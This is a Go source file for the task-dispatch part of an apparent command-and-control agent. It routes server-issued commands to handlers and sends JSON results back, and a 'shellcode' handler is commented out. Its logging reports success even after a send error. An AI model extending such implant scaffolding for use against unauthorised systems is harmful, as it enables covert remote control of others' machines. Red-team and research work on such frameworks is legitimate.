package agent

import (
	"encoding/json"
	"log"

	"c2framework/internals/server"
)

// OrchestratorFunc defines the signature for command orchestrator functions
type OrchestratorFunc func(agent *HTTPSAgent, job *server.HTTPSResponse) AgentTaskResult

// registerCommands registers all available command orchestrators
func registerCommands(agent *HTTPSAgent) {
	// agent.commandOrchestrators["shellcode"] = (*HTTPSAgent).orchestrateShellcode
	// Register other commands here in the future
}

// ExecuteTask receives a command from the server and routes it to the appropriate orchestrator
func (agent *HTTPSAgent) ExecuteTask(job *server.HTTPSResponse) {
	log.Printf("AGENT IS NOW PROCESSING COMMAND %s with ID %s", job.Command, job.JobID)

	var result AgentTaskResult

	// Look up the orchestrator for this command
	orchestrator, found := agent.commandOrchestrators[job.Command]

	if found {
		// Call the orchestrator
		result = orchestrator(agent, job)
	} else {
		// Command not recognized
		log.Printf("|WARN AGENT TASK| Received unknown command: '%s' (ID: %s)", job.Command, job.JobID)
		result = AgentTaskResult{
			JobID:   job.JobID,
			Success: false,
			Error:   "command not found",
		}
	}

	// Marshal the result before sending it back
	resultBytes, err := json.Marshal(result)
	if err != nil {
		log.Printf("|ERR AGENT TASK| Failed to marshal result for Task ID %s: %v", job.JobID, err)
		return // Cannot send result if marshalling fails
	}

	// Send the result back to the server
	log.Printf("|AGENT TASK|-> Sending result for Task ID %s (%d bytes)...", job.JobID, len(resultBytes))
	err = agent.SendResult(resultBytes)
	if err != nil {
		log.Printf("|ERR AGENT TASK| Failed to send result for Task ID %s: %v", job.JobID, err)
	}

	log.Printf("|AGENT TASK|-> Successfully sent result for Task ID %s.", job.JobID)
}
